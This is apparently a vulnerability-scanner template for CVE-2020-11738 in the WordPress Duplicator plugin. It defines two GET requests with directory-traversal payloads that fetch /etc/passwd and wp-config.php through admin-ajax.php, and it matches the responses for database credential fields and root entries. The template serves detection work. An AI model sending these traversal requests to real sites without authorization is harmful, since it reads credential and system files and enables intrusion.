name: yaml-poc-snapcreek-duplicator-directory_traversal-CVE-2020-11738
binding: 726afa86-e0e4-4db7-8d1a-7613c98678a7
detail:
    author: jiapeng.han
    links:
        - http://packetstormsecurity.com/files/160621/WordPress-Duplicator-1.3.26-Directory-Traversal-File-Read.html
        - http://packetstormsecurity.com/files/164533/WordPress-Duplicator-1.3.26-Arbitrary-File-Read.html
        - https://cwe.mitre.org/data/definitions/23.html
        - https://nvd.nist.gov/vuln/detail/CVE-2020-11738
        - https://packetstormsecurity.com/files/160621/WordPress-Duplicator-1.3.26-Directory-Traversal-File-Read.html
        - https://packetstormsecurity.com/files/164533/WordPress-Duplicator-1.3.26-Arbitrary-File-Read.html
        - https://snapcreek.com/duplicator/docs/changelog/?lite
        - https://www.exploit-db.com/exploits/50420
        - https://www.wordfence.com/blog/2020/02/active-attack-on-recently-patched-duplicator-plugin-vulnerability-affects-over-1-million-sites/
    vulnerability:
        id: 003b714a-c1da-477a-933b-7749e4bfe87f
        level: high
    warning: Harmless
transport: http
rules:
    r0:
        request:
            cache: true
            method: GET
            path: /wp-admin/admin-ajax.php?action=duplicator_download&file=..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd
            follow_redirects: false
        expression: response.status == 200 && response.raw_header.bcontains(b"File Transfer") && response.raw_header.bcontains(b"application/octet-stream") && 'attachment; filename="(wp-config.php|passwd)"'.bmatches(response.raw_header)
    r1:
        request:
            cache: true
            method: GET
            path: /wp-admin/admin-ajax.php?action=duplicator_download&file=%2F..%2Fwp-config.php
            follow_redirects: false
        expression: response.status == 200 && response.raw_header.bcontains(b"File Transfer") && response.raw_header.bcontains(b"application/octet-stream") && 'attachment; filename="(wp-config.php|passwd)"'.bmatches(response.raw_header) && ("DB_(NAME|USER|PASSWORD|HOST|CHARSET|COLLATE)".matches(response.body_string) || "root:.*:0:0:".matches(response.body_string))
expression: r0() && r1()
